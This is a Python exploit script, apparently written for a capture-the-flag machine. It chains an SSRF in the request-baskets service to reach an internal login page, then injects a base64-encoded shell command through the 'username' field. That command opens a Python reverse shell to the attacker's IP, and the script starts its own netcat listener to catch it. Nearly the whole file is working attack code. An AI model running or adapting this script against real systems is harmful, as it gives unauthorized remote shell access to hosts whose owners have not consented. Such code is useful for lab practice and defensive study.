#!/usr/bin/python3

import os, sys, signal
import requests
import json
import base64
import subprocess
import threading

def leaving(sig, frame):

    print("\n[!]Leaving...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, leaving)

proxy = {"http":"http://127.0.0.1:8080"}

#Global Variables

attacker_ip = sys.argv[1]
listen_port = sys.argv[2]
name_basket = sys.argv[4]
target = sys.argv[3] 

if len(sys.argv) != 5:

    print(f"[!]Use: {sys.argv[0]} <yourIP> <listenPort> <url_Target> <NameBasket>")

def getting_profile():
    
    new_target = target + "/api/baskets/" + name_basket
    request = requests.post(new_target)
    respose = request.text 
    parser_response = json.loads(respose)
    token = parser_response["token"]
    
    if request.status_code == 201:

        change_basket = target + "/api/baskets/" + name_basket
        
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Authorization": token,
                   "Accept": "application/json",
                   "Referer": "http://10.10.11.224:55555/web/{}".format(name_basket)
                   }

        data = {"forward_url":"http://127.0.0.1",
                "proxy_response":True,
                "insecure_tls":True,
                "expand_path":True,
                "capacity":200
        }

        #Serialize data in json format
        json_data = json.dumps(data)

        r = requests.put(change_basket, data=json_data, headers=headers)

    else:
        print("\n[!] Hubo un problema al generar el basket\n")

def nc_listen():

    command = f"nc -nlvp {listen_port}"
    subprocess.run(command, shell=True)


def makeRequest():
    
    
    getting_profile()
    
    payload = f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{listen_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
    
    objective = target + "/" + name_basket + "/login"
    
    payload_encode_bytes = payload.encode()
    payload_base64 = base64.b64encode(payload_encode_bytes)
    decoded_payload_base64 = payload_base64.decode('UTF-8')

    petition = {"username":";`echo \"%s\" | base64 -d | sh`"%decoded_payload_base64}
    
    r = requests.post(objective, data=petition)

if __name__=='__main__':

    listen_thread = threading.Thread(target=nc_listen)
    listen_thread.start()
    makeRequest()
